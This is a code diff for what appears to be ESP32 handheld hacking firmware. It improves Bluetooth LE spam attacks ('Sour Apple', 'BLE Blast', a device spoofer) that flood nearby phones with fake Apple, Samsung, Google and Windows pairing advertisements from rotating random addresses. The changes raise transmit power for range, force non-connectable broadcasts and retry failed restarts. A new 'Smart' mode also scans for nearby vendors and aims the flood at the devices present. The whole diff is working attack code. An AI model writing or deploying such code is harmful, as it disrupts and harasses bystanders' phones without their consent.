@@ -170,6 +170,26 @@ static void bleSetSpooferNavLabels() {
   setTouchNavLabels("Prev", "Type", "Exit", "Power", "Next");
 }
 
+// Resilient advertising (re)start shared by the BLE spam features. They stop and
+// restart advertising every cycle; on this heap-tight board NimBLE's start()
+// eventually fails, and the old code ignored the result (logged only to serial,
+// which is dead on the V2) so advertising silently died mid-run -- that's the
+// "Sour Apple / Blast stops after a while" bug. On a failed start, fully stop +
+// free a stuck scan (a running scan blocks adv start) + settle briefly, then
+// retry. Returns true once actually airing. Only call after a stop(), so a
+// false return means a real failure, not "already advertising".
+static bool bleAdvRestart(NimBLEAdvertising* adv) {
+  if (!adv) return false;
+  for (int attempt = 0; attempt < 3; ++attempt) {
+    if (adv->start()) return true;
+    adv->stop();
+    NimBLEScan* sc = BLEDevice::getScan();
+    if (sc) sc->stop();
+    delay(20);
+  }
+  return false;
+}
+
 namespace BleSpoofer {
 
 #define SCREEN_HEIGHT 250
@@ -277,7 +297,10 @@ bool generateSamsungAdvPacket(uint8_t modelIndex, BLEAdvertisementData& advData)
 bool generateGoogleAdvPacket(BLEAdvertisementData& advData) {
   uint8_t advDataRaw[GOOGLE_ADV_SIZE];
   memcpy(advDataRaw, GOOGLE_ADV_TEMPLATE, GOOGLE_ADV_SIZE);
-  advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)(random(121) - 100);
+  // Fast Pair "Tx Power" AD byte is a SIGNED dBm value. The old code did
+  // random(121) - 100 and cast to uint8_t, so any negative result wrapped to
+  // 156..255 -> a garbage power level. Write a plausible fixed value instead.
+  advDataRaw[GOOGLE_ADV_SIZE - 1] = (uint8_t)((int8_t)-30);  // -30 dBm, typical
   advData.addData(std::string((char*)advDataRaw, GOOGLE_ADV_SIZE));
   return true;
 }
@@ -843,7 +866,11 @@ void toggleAdvertising() {
       pAdvertising->setMaxInterval(0x20);
       pAdvertising->setMinPreferred(0x20);
       pAdvertising->setMaxPreferred(0x20);
-      bool adv_ok = pAdvertising->start();
+      // Broadcast-only spam -> non-connectable advertising. Connectable (the old
+      // default) let phones try to CONNECT to the fake beacon, wasting adv slots
+      // and stalling the spammer. ducky re-asserts CONN_MODE_UND for its HID.
+      pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
+      bool adv_ok = bleAdvRestart(pAdvertising);
       Serial.printf("[spoofer] pAdvertising->start() = %s\n", adv_ok ? "OK" : "FAIL");
 
       // On-screen diagnostics (S3 serial is unreliable: IDF logs vs USB-CDC).
@@ -1029,7 +1056,8 @@ void spooferLoop() {
       spooferSetRandomAddr();
       BLEAdvertisementData oAdvertisementData = getAdvertismentData();
       pAdvertising->setAdvertisementData(oAdvertisementData);
-      pAdvertising->start();
+      pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
+      bleAdvRestart(pAdvertising);
     }
   }
 }
@@ -1048,10 +1076,87 @@ void exit() {
 // Samsung/Google/Windows via setAdvertisingData) and rotates a fresh random
 // MAC on every step, so it hammers out one fake device after another.
 
+// --- Scan-and-match targeting (idea ported from M5PORKCHOP "PIGGY BLUES") -----
+// Before each blast round we briefly scan for real nearby devices and note which
+// vendors are present, then bias the blast toward only those vendors instead of
+// spraying all 22 blindly. Higher hit-rate, less wasted airtime. If the scan
+// finds nothing (or is flaky), we fall back to cycling ALL devices exactly like
+// before, so this can never do worse than the old behaviour.
+enum {
+  TGT_APPLE     = 0x01,
+  TGT_SAMSUNG   = 0x02,
+  TGT_GOOGLE    = 0x04,
+  TGT_MICROSOFT = 0x08
+};
+static const unsigned long BLAST_SCAN_PERIOD = 30000; // ms between target scans (Smart)
+static const unsigned long BLAST_SCAN_WINDOW = 2500;  // ms each scan lasts
+// Smart (true)  = scan what's in range every BLAST_SCAN_PERIOD and bias the blast.
+// Dumb  (false) = original blind cycle through all 22 devices, no scanning.
+// Toggled live from the nav bar (BTN_LEFT / "Smart"-"Dumb" slot) in blastLoop.
+bool blastTargeting = true;
+static volatile uint8_t s_targetMask = 0;    // vendors heard in the live scan
+static uint8_t s_targetMaskLatched = 0;      // snapshot the blast cycle uses
+static bool s_blastScanPhase = false;
+static unsigned long s_blastLastScan = 0;
+
+// Which vendor a blast deviceType (1..22) belongs to. Mirrors spooferDeviceLabel:
+// 1..17 Apple, 18..20 Samsung, 21 Google, 22 Microsoft.
+static uint8_t blastVendorOf(int type) {
+  if (type >= 18 && type <= 20) return TGT_SAMSUNG;
+  if (type == 21) return TGT_GOOGLE;
+  if (type == 22) return TGT_MICROSOFT;
+  return TGT_APPLE;
+}
+
+static String blastTargetLabel(uint8_t m) {
+  if (m == 0) return "all (no targets seen)";
+  String s;
+  if (m & TGT_APPLE)     s += "Apple ";
+  if (m & TGT_SAMSUNG)   s += "Samsung ";
+  if (m & TGT_GOOGLE)    s += "Google ";
+  if (m & TGT_MICROSOFT) s += "Windows ";
+  return s;
+}
+
+// Scan callback: tag the vendor of every advertiser we hear. Apple/Samsung/
+// Microsoft are identified by their manufacturer company ID; Google Fast Pair by
+// its 0xFE2C service UUID. Same NimBLE 1.x callback shape as the rest of this
+// file (cf. the AdvCallbacks classes used by the skimmer/sniffer).
+class BlastTargetCallbacks : public BLEAdvertisedDeviceCallbacks {
+  void onResult(BLEAdvertisedDevice* device) override {
+    if (!device) return;
+    uint8_t m = 0;
+    if (device->haveManufacturerData()) {
+      const std::string md = device->getManufacturerData();
+      if (md.size() >= 2) {
+        const uint16_t cid =
+            (uint8_t)md[0] | ((uint16_t)(uint8_t)md[1] << 8);
+        if (cid == 0x004C) m |= TGT_APPLE;
+        else if (cid == 0x0075) m |= TGT_SAMSUNG;
+        else if (cid == 0x0006) m |= TGT_MICROSOFT;
+      }
+    }
+    // Fast Pair advertises service UUID 0xFE2C. Match on the string form, which
+    // getServiceUUID()/toString() already produce elsewhere in this file, so we
+    // don't depend on isAdvertisingService()/BLEUUID availability.
+    if (device->haveServiceUUID()) {
+      const std::string su = device->getServiceUUID().toString();
+      if (su.find("fe2c") != std::string::npos ||
+          su.find("FE2C") != std::string::npos) {
+        m |= TGT_GOOGLE;
+      }
+    }
+    if (m) s_targetMask |= m;
+  }
+};
+static BlastTargetCallbacks s_blastTargetCb;
+
 void blastSetup() {
   if (!bleRequireStackOrExit()) return;
   setTouchButtonInputEnabled(true);
-  setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, nullptr);
+  // Left slot (BTN_LEFT) toggles Smart<->Dumb; center exits. Label shows the
+  // CURRENT mode so a tap flips it.
+  setTouchNavLabels(blastTargeting ? "Smart" : "Dumb", nullptr, "Exit", nullptr, nullptr);
   spooferResetPanelCache();
   bleClearBody(TFT_BLACK);
 
@@ -1062,6 +1167,12 @@ void blastSetup() {
 
   setupTouchscreen();
   randomSeed(analogRead(0));
+
+  // Max BLE TX power for range. Every other spoof mode already does this; Blast
+  // was left at the post-init default (~+3 dBm), which is why its range was
+  // noticeably shorter than the single-device spoofer (+9 dBm).
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
 
   if (!pAdvertising) {
     BLEServer* pServer = BLEDevice::createServer();
@@ -1079,13 +1190,21 @@ void blastSetup() {
   tft.setTextSize(1);
   tft.setTextColor(TFT_WHITE, TFT_BLACK);
   tft.setCursor(6, 42);
-  tft.print("BLE Blast - cycling ALL devices");
+  tft.print("BLE Blast - LEFT: Smart/Dumb");
   tft.setCursor(6, 54);
   tft.setTextColor(DARK_GRAY, TFT_BLACK);
   tft.print("Apple / Samsung / Google / Windows");
 
   deviceType = 0;        // first loop step advances to 1
   isAdvertising = true;
+
+  // Targeting: reset, and schedule the first scan ~2s in so the blast locks onto
+  // nearby vendors quickly instead of waiting a full period. For the first ~2s it
+  // blasts all devices (latched mask is 0), then switches to the matched set.
+  s_targetMask = 0;
+  s_targetMaskLatched = 0;
+  s_blastScanPhase = false;
+  s_blastLastScan = millis() - (BLAST_SCAN_PERIOD - 2000);
 }
 
 void blastLoop() {
@@ -1096,14 +1215,98 @@ void blastLoop() {
 
   static unsigned long lastStep = 0;
   unsigned long now = millis();
+
+  // --- Smart/Dumb toggle (nav left slot / physical LEFT) --------------------
+  // Flip targeting live. Switching to Dumb mid-scan cleanly aborts the scan and
+  // resumes blasting all 22; switching to Smart re-arms a scan ~2s out.
+  if (isButtonPressedEdge(BTN_LEFT)) {
+    blastTargeting = !blastTargeting;
+    if (s_blastScanPhase) {                 // abort an in-progress scan
+      NimBLEScan* sc = BLEDevice::getScan();
+      if (sc) { sc->stop(); sc->setAdvertisedDeviceCallbacks(nullptr); }
+      s_blastScanPhase = false;
+      isAdvertising = true;
+    }
+    if (blastTargeting) {                    // -> Smart: scan soon
+      s_targetMask = 0;
+      s_blastLastScan = now - (BLAST_SCAN_PERIOD - 2000);
+    } else {                                 // -> Dumb: blast everything
+      s_targetMaskLatched = 0;
+    }
+    lastStep = 0;                            // advertise immediately
+    setTouchNavLabels(blastTargeting ? "Smart" : "Dumb", nullptr, "Exit", nullptr, nullptr);
+    redrawTouchButtonBar();
+    tft.fillRect(0, 84, 240, 12, TFT_BLACK);
+    tft.setTextFont(1);
+    tft.setTextSize(1);
+    tft.setTextColor(DARK_GRAY, TFT_BLACK);
+    tft.setCursor(6, 84);
+    tft.print(blastTargeting ? "Mode: Smart (scan every 30s)" : "Mode: Dumb (all devices)");
+  }
+
+  // --- Targeting scan phase -------------------------------------------------
+  // Periodically pause the blast and sniff which vendors are actually nearby.
+  // The controller can't reliably scan and advertise at the same time, so we
+  // interleave: a short receive-only window, then resume blasting biased to what
+  // we heard. Falls back to "all devices" if nothing is found.
+  if (blastTargeting) {
+    if (!s_blastScanPhase && (now - s_blastLastScan >= BLAST_SCAN_PERIOD)) {
+      if (pAdvertising) pAdvertising->stop();
+      isAdvertising = false;
+      s_targetMask = 0;
+      NimBLEScan* sc = BLEDevice::getScan();
+      if (sc) {
+        sc->stop();
+        sc->setAdvertisedDeviceCallbacks(&s_blastTargetCb, true);
+        sc->setActiveScan(true);
+        sc->setInterval(80);
+        sc->setWindow(60);
+        sc->setDuplicateFilter(false);
+        sc->start(0, nullptr, false);   // non-blocking
+      }
+      s_blastScanPhase = true;
+      s_blastLastScan = now;
+      tft.fillRect(0, 70, 240, 26, TFT_BLACK);
+      tft.setTextFont(1);
+      tft.setTextSize(1);
+      tft.setTextColor(TFT_WHITE, TFT_BLACK);
+      tft.setCursor(6, 72);
+      tft.print("Scanning for nearby targets...");
+      return;
+    }
+    if (s_blastScanPhase) {
+      if (now - s_blastLastScan < BLAST_SCAN_WINDOW) {
+        return;                         // keep listening; don't advertise yet
+      }
+      NimBLEScan* sc = BLEDevice::getScan();
+      if (sc) {
+        sc->stop();
+        sc->setAdvertisedDeviceCallbacks(nullptr);
+      }
+      s_targetMaskLatched = s_targetMask;
+      s_blastScanPhase = false;
+      isAdvertising = true;
+      lastStep = 0;                     // advertise immediately below
+    }
+  }
+
   if (now - lastStep < 250) {
     return;
   }
   lastStep = now;
 
-  // Advance to the next device entry and load its advertising selectors.
+  // Advance to the next device entry. When targeting has locked onto one or more
+  // nearby vendors, skip devices whose vendor isn't present so we only blast what
+  // can actually bite. Bounded skip (<=22) can't loop forever.
   deviceType++;
   if (deviceType > 22) deviceType = 1;
+  if (blastTargeting && s_targetMaskLatched != 0) {
+    int guard = 0;
+    while (!(blastVendorOf(deviceType) & s_targetMaskLatched) && guard++ < 22) {
+      deviceType++;
+      if (deviceType > 22) deviceType = 1;
+    }
+  }
   setAdvertisingData();
 
   if (pAdvertising) {
@@ -1117,21 +1320,39 @@ void blastLoop() {
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->setMinInterval(0x20);
     pAdvertising->setMaxInterval(0x20);
-    pAdvertising->start();
+    pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
+    bleAdvRestart(pAdvertising);
   }
 
-  // Show what is currently being blasted.
-  tft.fillRect(0, 70, 240, 14, TFT_BLACK);
+  // Show what is currently being blasted + the current target lock.
+  tft.fillRect(0, 70, 240, 26, TFT_BLACK);
   tft.setTextFont(1);
   tft.setTextSize(1);
   tft.setTextColor(TFT_GREEN, TFT_BLACK);
   tft.setCursor(6, 72);
   tft.print(String(deviceType) + "/22: ");
   tft.print(spooferDeviceLabel(deviceType));
+  tft.setTextColor(DARK_GRAY, TFT_BLACK);
+  tft.setCursor(6, 84);
+  if (blastTargeting) {
+    tft.print("Target: " + blastTargetLabel(s_targetMaskLatched));
+  } else {
+    tft.print("Mode: Dumb (all devices)");
+  }
 }
 
 void blastExit() {
   spooferResetPanelCache();
+  // Stop a targeting scan if we exit mid-window, and detach the callback so the
+  // host task can't call back into freed UI state after we leave.
+  if (s_blastScanPhase) {
+    NimBLEScan* sc = BLEDevice::getScan();
+    if (sc) {
+      sc->stop();
+      sc->setAdvertisedDeviceCallbacks(nullptr);
+    }
+    s_blastScanPhase = false;
+  }
   if (isAdvertising && pAdvertising) {
     pAdvertising->stop();
     isAdvertising = false;
@@ -1360,8 +1581,10 @@ void sourappleLoop() {
   Advertising->setMaxInterval(0x20);
   Advertising->setMinPreferred(0x20);
   Advertising->setMaxPreferred(0x20);
+  // Non-connectable broadcast (iOS proximity spam is non-connectable anyway).
+  Advertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
 
-  bool adv_ok = Advertising->start();
+  bool adv_ok = bleAdvRestart(Advertising);
   Serial.printf("[sourapple] Advertising->start() = %s\n", adv_ok ? "OK" : "FAIL");
 
   delay(40);
